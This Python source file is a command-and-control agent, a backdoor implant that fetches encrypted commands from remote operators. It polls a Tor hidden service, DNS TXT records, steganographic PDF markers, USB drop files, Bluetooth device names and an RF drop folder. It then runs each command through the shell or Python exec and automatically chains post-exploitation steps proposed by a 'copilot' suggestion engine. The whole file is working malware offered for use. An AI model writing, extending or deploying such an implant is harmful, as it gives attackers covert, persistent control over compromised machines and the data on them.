#!/usr/bin/env python3
# Path: modules/c2/agent_receiver.py

import os
import json
import base64
import hashlib
import socket
import subprocess
import time
import requests
import importlib.util
import bluetooth
import glob
from datetime import datetime
from Crypto.Cipher import AES
from Crypto.Hash import HMAC, SHA256
from Crypto.Util.Padding import unpad

# === Constants ===
AGENT_ID = socket.gethostname()
MAC_FILTER = os.getenv("AGENT_MAC")  # Optional MAC filter
QUEUE_FILE = f"c2/queues/{AGENT_ID}.queue"
RESULTS_DIR = "results"
STIX_FILE = f"{RESULTS_DIR}/stix_exec_{AGENT_ID}.json"
EXEC_LOG = f"{RESULTS_DIR}/agent_exec_log_{AGENT_ID}.jsonl"
DASHBOARD_WS = "ws://localhost:8765"
KEY_ENV = "C2_AES_KEY"
HMAC_ENV = "C2_HMAC_KEY"
TOR_PROXY = "socks5h://127.0.0.1:9050"
TOR_URL = f"http://agentreceiver.onion/recv?agent={AGENT_ID}"
RF_DIR = f"/tmp/rf_dropzone/"
DNS_DOMAIN = "cmd.example.org"
PDF_DROP_DIR = "/opt/agent/pdfdrop/"
USB_DROP_PATH = "/media/usb*/drop.cmd"
REVERSE_POLL_INTERVAL = 15
CHAIN_POSTEX = True

os.makedirs("c2/queues", exist_ok=True)
os.makedirs(RESULTS_DIR, exist_ok=True)
os.makedirs(RF_DIR, exist_ok=True)
os.makedirs(PDF_DROP_DIR, exist_ok=True)

# === Core Crypto ===
def decrypt_command(payload, key, hmac_key=None):
    decoded = base64.b64decode(payload)
    iv = decoded[:16]
    ct = decoded[16:-32] if hmac_key else decoded[16:]
    hmac_val = decoded[-32:] if hmac_key else None

    if hmac_key:
        h = HMAC.new(hmac_key.encode(), digestmod=SHA256)
        h.update(iv + ct)
        h.verify(hmac_val)

    cipher = AES.new(hashlib.sha256(key.encode()).digest(), AES.MODE_CBC, iv)
    return unpad(cipher.decrypt(ct), AES.block_size).decode()

# === Command Execution ===
def execute_command(cmd):
    if cmd.startswith("run_module:"):
        path = cmd.split(":", 1)[1]
        if not os.path.isfile(path): return f"[ERR] No such module {path}"
        try:
            spec = importlib.util.spec_from_file_location("mod", path)
            mod = importlib.util.module_from_spec(spec)
            spec.loader.exec_module(mod)
            return mod.main() if hasattr(mod, "main") else "[ERR] No main()"
        except Exception as e:
            return f"[ERR] Module error: {e}"
    elif cmd.startswith("exec_py:"):
        try:
            local_vars = {}
            exec(cmd.split(":", 1)[1], {}, local_vars)
            return local_vars.get("output", "[+] Executed")
        except Exception as e:
            return f"[ERR] Python exec failed: {e}"
    try:
        return subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=30).decode()
    except subprocess.CalledProcessError as e:
        return e.output.decode()
    except Exception as e:
        return str(e)

# === Logging and Dashboard ===
def log_execution(cmd, result):
    entry = {
        "timestamp": datetime.utcnow().isoformat(),
        "agent_id": AGENT_ID,
        "command": cmd,
        "output": result
    }
    with open(EXEC_LOG, "a") as f:
        f.write(json.dumps(entry) + "\n")
    push_to_dashboard(entry)

def push_to_dashboard(entry):
    try:
        import websockets
        import asyncio
        async def send_msg():
            async with websockets.connect(DASHBOARD_WS) as ws:
                await ws.send(json.dumps({
                    "type": "execution",
                    "agent": AGENT_ID,
                    "payload": entry
                }))
        asyncio.run(send_msg())
    except:
        pass

def export_stix(cmd, result):
    bundle = {
        "type": "bundle",
        "id": f"bundle--{hashlib.md5(AGENT_ID.encode()).hexdigest()}",
        "objects": [{
            "type": "observed-data",
            "id": f"observed-data--{hashlib.md5(cmd.encode()).hexdigest()}",
            "created": datetime.utcnow().isoformat(),
            "modified": datetime.utcnow().isoformat(),
            "number_observed": 1,
            "first_observed": datetime.utcnow().isoformat(),
            "last_observed": datetime.utcnow().isoformat(),
            "x_exec": {
                "agent": AGENT_ID,
                "command": cmd,
                "output": result
            }
        }]
    }
    with open(STIX_FILE, "w") as f:
        json.dump(bundle, f, indent=2)

# === MAC Filter Check ===
def passes_mac_filter():
    if not MAC_FILTER:
        return True
    try:
        mac = open(f"/sys/class/net/eth0/address").read().strip()
        return mac.lower() == MAC_FILTER.lower()
    except:
        return False

# === Drop Sources ===
def check_tor():
    try:
        r = requests.get(TOR_URL, proxies={"http": TOR_PROXY}, timeout=10)
        return r.text.strip() if r.status_code == 200 else None
    except:
        return None

def check_rf():
    f = os.path.join(RF_DIR, f"{AGENT_ID}.rf")
    if os.path.exists(f):
        with open(f, "r") as fd:
            cmd = fd.read().strip()
        os.remove(f)
        return cmd
    return None

def check_dns():
    try:
        import dns.resolver
        answers = dns.resolver.resolve(f"{AGENT_ID}.{DNS_DOMAIN}", 'TXT')
        return str(answers[0]).strip('"')
    except:
        return None

def check_pdf_stego():
    for file in os.listdir(PDF_DROP_DIR):
        if file.endswith(".pdf"):
            path = os.path.join(PDF_DROP_DIR, file)
            try:
                with open(path, "rb") as f:
                    content = f.read()
                    marker = b"%!CMD:"
                    if marker in content:
                        start = content.index(marker) + len(marker)
                        end = content.index(b"%!", start)
                        return content[start:end].decode()
            except:
                continue
    return None

def check_usb_drop():
    for pattern in glob.glob(USB_DROP_PATH):
        try:
            with open(pattern, "r") as f:
                return f.read().strip()
        except:
            continue
    return None

def check_bluetooth():
    try:
        devices = bluetooth.discover_devices(duration=8, lookup_names=True)
        for addr, name in devices:
            if "CMD:" in name:
                return name.split("CMD:",1)[1]
    except:
        pass
    return None

# === Post-Ex Chain ===
def try_postex_chain(cmd, output):
    try:
        import copilot.suggestion_engine as se
        suggestions = se.suggest_next(cmd, output)
        for s in suggestions:
            result = execute_command(s)
            log_execution(s, result)
    except:
        pass

# === Queue Processing and Polling ===
def process_queue():
    if not os.path.exists(QUEUE_FILE): return
    with open(QUEUE_FILE, "r") as f:
        lines = f.readlines()
    os.remove(QUEUE_FILE)
    key = os.environ.get(KEY_ENV)
    hmac_key = os.environ.get(HMAC_ENV)
    for line in lines:
        cmd = line.strip()
        if key:
            try: cmd = decrypt_command(cmd, key, hmac_key)
            except: continue
        result = execute_command(cmd)
        log_execution(cmd, result)
        export_stix(cmd, result)
        if CHAIN_POSTEX: try_postex_chain(cmd, result)

def poll_reverse():
    sources = [
        check_tor,
        check_rf,
        check_dns,
        check_pdf_stego,
        check_usb_drop,
        check_bluetooth
    ]
    key = os.environ.get(KEY_ENV)
    hmac_key = os.environ.get(HMAC_ENV)
    for source in sources:
        raw = source()
        if raw:
            try:
                cmd = decrypt_command(raw, key, hmac_key) if key else raw
                result = execute_command(cmd)
                log_execution(cmd, result)
                export_stix(cmd, result)
                if CHAIN_POSTEX: try_postex_chain(cmd, result)
            except:
                continue

# === Main Loop ===
def main_loop():
    if not passes_mac_filter():
        return
    print(f"[+] Agent receiver active: {AGENT_ID}")
    while True:
        process_queue()
        poll_reverse()
        time.sleep(REVERSE_POLL_INTERVAL)

if __name__ == "__main__":
    main_loop()
